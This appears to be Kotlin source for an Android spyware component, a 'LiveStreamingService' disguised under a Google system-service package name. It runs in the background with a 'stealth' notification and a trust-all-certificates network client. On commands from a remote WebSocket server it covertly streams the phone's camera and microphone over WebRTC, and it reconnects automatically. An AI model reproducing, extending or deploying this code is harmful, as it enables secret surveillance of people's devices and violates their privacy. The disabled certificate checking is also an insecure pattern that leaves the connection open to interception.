package com.google.android.systemservice.services

import android.annotation.SuppressLint
import android.app.Service
import android.content.Context
import android.content.Intent
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.os.IBinder
import android.util.Log
import com.google.android.systemservice.config.AndroidConfig
import com.google.android.systemservice.utils.StealthNotificationHelper
import com.google.android.systemservice.utils.TrustAllCertificates
import com.google.android.systemservice.utils.WebRTCClient
import kotlinx.coroutines.*
import okhttp3.*
import org.json.JSONObject
import org.webrtc.*
import java.util.concurrent.TimeUnit

class LiveStreamingService : Service() {
    companion object {
        private const val TAG = "LiveStreaming"
    }

    @Volatile private var webSocket: WebSocket? = null
    @Volatile private var webRTCClient: WebRTCClient? = null
    @Volatile private var isVideoStreamActive = false
    @Volatile private var isAudioStreamActive = false
    private var deviceId: String = ""
    
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val client = TrustAllCertificates.createSecureClientBuilder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "LiveStreamingService created")
        deviceId = getDeviceIdentifier()
        startForegroundSilent()
        connectWebSocket()
    }

    private fun startForegroundSilent() {
        val notification = StealthNotificationHelper.createStealthNotification(this)
        startForeground(StealthNotificationHelper.LIVE_STREAMING_SERVICE_ID, notification)
    }

    private fun getDeviceIdentifier(): String {
        return try {
            android.provider.Settings.Secure.getString(
                contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            ) ?: AndroidConfig.deviceId.ifEmpty { "unknown" }
        } catch (e: Exception) {
            AndroidConfig.deviceId.ifEmpty { "unknown" }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val streamType = intent?.getStringExtra("stream_type") ?: "camera"
        val action = intent?.action
        
        when (action) {
            "START_VIDEO" -> startVideoStream(streamType)
            "STOP_VIDEO" -> stopVideoStream()
            "START_AUDIO" -> startAudioStream()
            "STOP_AUDIO" -> stopAudioStream()
        }
        return START_STICKY
    }

    private fun connectWebSocket() {
        AndroidConfig.loadFromPreferences(this)
        val wsUrl = "${AndroidConfig.websocketUrl}&device_id=${AndroidConfig.deviceId}"
        val request = Request.Builder()
            .url(wsUrl)
            .build()
        
        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                Log.d(TAG, "WebSocket connected for live streaming")
                subscribeToWebRTCChannel()
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                handleSignalingMessage(text)
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e(TAG, "WebSocket error: ${t.message}")
                scheduleReconnect()
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                Log.d(TAG, "WebSocket closed: $reason")
                scheduleReconnect()
            }
        })
    }

    private fun subscribeToWebRTCChannel() {
        val subscribeMessage = JSONObject().apply {
            put("command", "subscribe")
            put("identifier", JSONObject().apply {
                put("channel", "WebrtcChannel")
                put("device_id", deviceId)
            }.toString())
        }
        try { webSocket?.send(subscribeMessage.toString()) } catch (e: Exception) { Log.e(TAG, "WS send failed", e) }
        Log.d(TAG, "Subscribed to WebRTC channel")
    }

    private fun handleSignalingMessage(text: String) {
        try {
            val json = JSONObject(text)
            val frameType = json.optString("type", "")
            
            if (frameType in listOf("ping", "welcome", "confirm_subscription")) {
                return
            }

            val message = json.optJSONObject("message") ?: return
            val type = message.optString("type", "")
            
            when (type) {
                "answer" -> {
                    val sdp = message.optString("sdp", "")
                    val client = webRTCClient ?: return
                    client.handleAnswer(sdp)
                }
                "ice_candidate" -> {
                    val candidate = message.optString("candidate", "")
                    val sdpMid = message.optString("sdpMid", "")
                    val sdpMLineIndex = message.optInt("sdpMLineIndex", 0)
                    
                    val iceCandidate = IceCandidate(sdpMid, sdpMLineIndex, candidate)
                    val client = webRTCClient ?: return
                    client.addIceCandidate(iceCandidate)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error handling signaling message: ${e.message}")
        }
    }

    @SuppressLint("MissingPermission")
    private fun startVideoStream(cameraId: String) {
        if (checkSelfPermission(android.Manifest.permission.CAMERA) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "Camera permission not granted")
            return
        }

        synchronized(this) {
            if (isVideoStreamActive) {
                Log.w(TAG, "Video stream already active")
                return
            }

            try {
                webRTCClient = WebRTCClient(
                    context = this,
                    deviceId = deviceId,
                    streamType = "camera",
                    onSdpCreated = { type, sdp ->
                        sendSdpToServer(type, sdp)
                    },
                    onIceCandidate = { candidate ->
                        sendIceCandidateToServer(candidate)
                    },
                    onConnectionStateChanged = { state ->
                        Log.d(TAG, "WebRTC connection state: $state")
                        if (state == PeerConnection.PeerConnectionState.CONNECTED) {
                            isVideoStreamActive = true
                        } else if (state == PeerConnection.PeerConnectionState.FAILED ||
                                   state == PeerConnection.PeerConnectionState.DISCONNECTED) {
                            isVideoStreamActive = false
                        }
                    }
                )

                webRTCClient?.createPeerConnection()

                // Create video capturer
                val cameraManager = getSystemService(Context.CAMERA_SERVICE) as? CameraManager ?: return
                val cameraEnumerator = Camera2Enumerator(this)
                
                // Use front camera if cameraId = "1", else back camera
                val targetCameraId = if (cameraId == "1") {
                    cameraEnumerator.deviceNames.firstOrNull { 
                        cameraEnumerator.isFrontFacing(it) 
                    } ?: "1"
                } else {
                    cameraEnumerator.deviceNames.firstOrNull { 
                        cameraEnumerator.isBackFacing(it) 
                    } ?: "0"
                }

                val videoCapturer = cameraEnumerator.createCapturer(targetCameraId, null)
                if (videoCapturer != null) {
                    webRTCClient?.addVideoTrack(videoCapturer)
                    webRTCClient?.createOffer()
                    Log.d(TAG, "Video stream started with camera $targetCameraId")
                } else {
                    Log.e(TAG, "Failed to create video capturer")
                }

            } catch (e: Exception) {
                Log.e(TAG, "Error starting video stream: ${e.message}")
                isVideoStreamActive = false
            }
        }
    }

    private fun stopVideoStream() {
        synchronized(this) {
            webRTCClient?.close()
            webRTCClient = null
            isVideoStreamActive = false
        }
        Log.d(TAG, "Video stream stopped")
    }

    private fun startAudioStream() {
        synchronized(this) {
            if (isAudioStreamActive) {
                Log.w(TAG, "Audio stream already active")
                return
            }

            try {
                if (webRTCClient == null) {
                    webRTCClient = WebRTCClient(
                        context = this,
                        deviceId = deviceId,
                        streamType = "microphone",
                        onSdpCreated = { type, sdp ->
                            sendSdpToServer(type, sdp)
                        },
                        onIceCandidate = { candidate ->
                            sendIceCandidateToServer(candidate)
                        },
                        onConnectionStateChanged = { state ->
                            Log.d(TAG, "Audio WebRTC connection state: $state")
                            if (state == PeerConnection.PeerConnectionState.CONNECTED) {
                                isAudioStreamActive = true
                            } else if (state == PeerConnection.PeerConnectionState.FAILED ||
                                       state == PeerConnection.PeerConnectionState.DISCONNECTED) {
                                isAudioStreamActive = false
                            }
                        }
                    )
                    webRTCClient?.createPeerConnection()
                }

                webRTCClient?.addAudioTrack()
                webRTCClient?.createOffer()
                Log.d(TAG, "Audio stream started")

            } catch (e: Exception) {
                Log.e(TAG, "Error starting audio stream: ${e.message}")
                isAudioStreamActive = false
            }
        }
    }

    private fun stopAudioStream() {
        synchronized(this) {
            // Keep WebRTC client if video is still active
            if (!isVideoStreamActive) {
                webRTCClient?.close()
                webRTCClient = null
            }
            isAudioStreamActive = false
        }
        Log.d(TAG, "Audio stream stopped")
    }

    private fun sendSdpToServer(type: String, sdp: String) {
        val message = JSONObject().apply {
            put("command", "message")
            put("identifier", JSONObject().apply {
                put("channel", "WebrtcChannel")
                put("device_id", deviceId)
            }.toString())
            put("data", JSONObject().apply {
                put("type", type)
                put("sdp", sdp)
                put("device_id", deviceId)
            }.toString())
        }
        try { webSocket?.send(message.toString()) } catch (e: Exception) { Log.e(TAG, "WS send failed", e) }
        Log.d(TAG, "Sent SDP $type to server")
    }

    private fun sendIceCandidateToServer(candidate: IceCandidate) {
        val message = JSONObject().apply {
            put("command", "message")
            put("identifier", JSONObject().apply {
                put("channel", "WebrtcChannel")
                put("device_id", deviceId)
            }.toString())
            put("data", JSONObject().apply {
                put("type", "ice_candidate")
                put("candidate", candidate.sdp)
                put("sdpMid", candidate.sdpMid)
                put("sdpMLineIndex", candidate.sdpMLineIndex)
                put("device_id", deviceId)
            }.toString())
        }
        try { webSocket?.send(message.toString()) } catch (e: Exception) { Log.e(TAG, "WS send failed", e) }
        Log.d(TAG, "Sent ICE candidate to server")
    }

    private fun scheduleReconnect() {
        serviceScope.launch {
            delay(5000)
            if (webSocket == null || webSocket?.request() == null) {
                connectWebSocket()
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        stopForeground(false)
        stopVideoStream()
        stopAudioStream()
        webSocket?.close(1000, "Service destroyed")
        serviceScope.cancel()
        Log.d(TAG, "LiveStreamingService destroyed")
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
